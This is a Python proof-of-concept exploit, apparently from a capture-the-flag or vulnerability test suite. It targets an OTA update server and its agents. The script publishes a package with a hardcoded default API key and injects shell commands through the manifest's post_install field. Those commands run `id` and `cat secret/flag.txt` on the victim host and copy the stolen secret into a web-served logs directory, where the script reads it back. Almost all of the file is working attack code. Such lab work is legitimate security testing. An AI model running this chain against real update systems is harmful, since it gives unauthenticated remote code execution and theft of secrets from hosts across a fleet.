#!/usr/bin/env python3
"""
PoC #4: Command injection via the post_install manifest field
-----------------------------------------------------------------
The README documents `post_install` as a maintenance keyword - "none" or
"restart". ota-agent.sh never validates that: after extracting a package it
runs `sh -c "$post_install"` unconditionally whenever the field is present
and isn't literally "none". Combined with #2 (default API key), this is a full unauthenticated remote-code-execution chain against
any module in the fleet, reachable purely by publishing to the OTA server.

This PoC publishes an update for "log" whose post_install runs `id` (proof the
shell ran) AND `cat`s log-module's real per-deployment secret file
(secret/flag.txt, materialized from the minted LOG_FLAG_VALUE by log's
entrypoint) into log-module's HTTP-served logs/ directory. It waits for the
agent to poll, apply, and run it, then reads that back through log-module's
real GET /logs/{name} endpoint.

Scoreable impact: the RCE is only supporting evidence — pass/fail hinges on
exfiltrating the sibling host's minted FLAG{...} (and, when the harness exports
LOG_FLAG_VALUE into this PoC's env, on it matching that exact value). RCE that
merely proved it could run a command (reading back a self-planted token) would
recover nothing the harness minted; running the shell as the `ctf` user, the
same primitive reads any secret that user can — so it steals the deployment's
real credential off the victim, which is what actually scores.

Run against the docker-compose fleet:
  docker compose -f vuln_tests/docker-compose.yml run --build --rm poc \
      python3 04_post_install_command_injection.py ota 8090
"""
import hashlib
import io
import json
import os
import re
import sys
import tarfile
import time
import urllib.error
import urllib.request
import uuid

OTA_HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
OTA_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8090
OTA_BASE = f"http://{OTA_HOST}:{OTA_PORT}"
LOG_HOST = os.environ.get("LOG_HOST", "log")
LOG_PORT = int(os.environ.get("LOG_PORT", "8080"))
LOG_BASE = f"http://{LOG_HOST}:{LOG_PORT}"
# If a harness has configured a real key (fixing vuln #2), use it so this
# PoC keeps testing #4 (post_install command injection) in isolation instead
# of false-negativing on an unrelated 401 at /publish once #2 is patched.
# `or`, not the two-arg os.environ.get form, so an empty value falls back
# too (matches the server's own envOr() in main.go).
API_KEY = os.environ.get("OTA_API_KEY") or "ota-default-key-2024"
# If the harness exports the log sibling's minted flag into this PoC's env,
# assert the exfiltrated value equals it exactly; otherwise assert the
# FLAG{...} shape of whatever real per-deployment secret we steal off the host.
EXPECTED_FLAG = os.environ.get("LOG_FLAG_VALUE", "")
FLAG_RE = re.compile(r"FLAG\{[^}]{1,256}\}")


def make_targz(entries):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, content in entries:
            info = tarfile.TarInfo(name=name)
            info.size = len(content)
            tf.addfile(info, io.BytesIO(content))
    return buf.getvalue()


def multipart(fields, filename, file_bytes):
    boundary = "----otaPoC" + uuid.uuid4().hex
    body = b""
    for name, value in fields.items():
        body += (f"--{boundary}\r\nContent-Disposition: form-data; "
                  f'name="{name}"\r\n\r\n{value}\r\n').encode()
    body += (f"--{boundary}\r\nContent-Disposition: form-data; "
              f'name="package"; filename="{filename}"\r\n'
              "Content-Type: application/gzip\r\n\r\n").encode()
    body += file_bytes + b"\r\n"
    body += f"--{boundary}--\r\n".encode()
    return boundary, body


def main():
    token = uuid.uuid4().hex[:12]
    proof_name = f"cmdi_{token}.txt"
    # A harmless-looking package - the RCE lives entirely in post_install,
    # not in the archive contents.
    package = make_targz([("README.txt", b"routine log-module maintenance update\n")])
    sha = hashlib.sha256(package).hexdigest()
    version = f"1.0.1-cmdi-{token[:6]}"

    # `id` proves the shell ran (RCE evidence); `cat secret/flag.txt` steals the
    # victim host's minted per-deployment secret. post_install runs with
    # cwd=$OTA_INSTALL_DIR (=/home/ctf/log; see ota-agent.sh), where both
    # logs/ (HTTP-served) and secret/flag.txt live, and as the `ctf` user that
    # owns the flag file.
    post_install = (
        f"id > logs/{proof_name}; "
        f"echo OTA_RCE_{token} >> logs/{proof_name}; "
        f"cat secret/flag.txt >> logs/{proof_name}"
    )
    manifest = {
        "module": "log",
        "version": version,
        "sha256": sha,
        "post_install": post_install,
    }

    boundary, body = multipart({"manifest": json.dumps(manifest)}, "pkg.tar.gz", package)
    req = urllib.request.Request(f"{OTA_BASE}/publish", data=body, method="POST")
    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    req.add_header("X-OTA-Api-Key", API_KEY)
    print(f"[*] Publishing log {version} with post_install={post_install!r}")
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            print(f"[*] /publish -> {r.status}")
    except urllib.error.HTTPError as e:
        detail = e.read().decode(errors="replace")[:200]
        print(f"[*] /publish -> {e.code} {detail}")
        if e.code == 401:
            # 401 is the API-key gate (vuln #2), not #4. This deployment set a
            # real OTA_API_KEY that this PoC didn't present.
            print("[-] Rejected at the API-key gate. Provide the deployment's OTA_API_KEY:")
            print("      OTA_API_KEY=<key> python3 04_post_install_command_injection.py <host> <port>")
            print("    (the vuln_tests docker-compose passes it into the poc container for you.)")
            return 2
        print("[-] Publish was rejected - post_install is now validated (vuln #4 fixed) "
              "or the manifest was otherwise refused.")
        return 1

    print("[*] Waiting for log-module's agent to poll, apply, and run post_install...")
    deadline = time.time() + 60
    got = None
    while time.time() < deadline:
        try:
            with urllib.request.urlopen(f"{LOG_BASE}/logs/{proof_name}", timeout=5) as r:
                body = r.read().decode(errors="replace")
            if f"OTA_RCE_{token}" in body:
                got = body
                break
        except urllib.error.HTTPError:
            pass
        except (urllib.error.URLError, ConnectionError):
            pass
        time.sleep(3)

    if got is None:
        print("[-] Timed out waiting for post_install's output to appear via /logs/{name}")
        return 1

    print("[+] Command injection confirmed - post_install executed on the log container:")
    print("    " + got.strip().replace("\n", "\n    "))

    m = FLAG_RE.search(got)
    if not m:
        print("[-] RCE ran, but no FLAG{...} was exfiltrated from secret/flag.txt")
        print("    (is LOG_FLAG_VALUE materialized on the log host? did `cat` fail?)")
        return 1
    flag = m.group(0)

    if EXPECTED_FLAG:
        if flag == EXPECTED_FLAG:
            print(f"[+] SCORED: the RCE read the log host's minted secret and it matches")
            print(f"    the configured LOG_FLAG_VALUE: {flag!r}")
            return 0
        print(f"[-] Exfiltrated {flag!r} but expected {EXPECTED_FLAG!r} — value mismatch.")
        return 1

    print(f"[+] SCORED: the RCE exfiltrated the log host's minted per-deployment")
    print(f"    secret off disk: {flag!r}")
    print("[*] (No LOG_FLAG_VALUE in this PoC's env to assert the exact value against;")
    print("     the recovered FLAG{...} is the live per-deployment secret regardless.)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
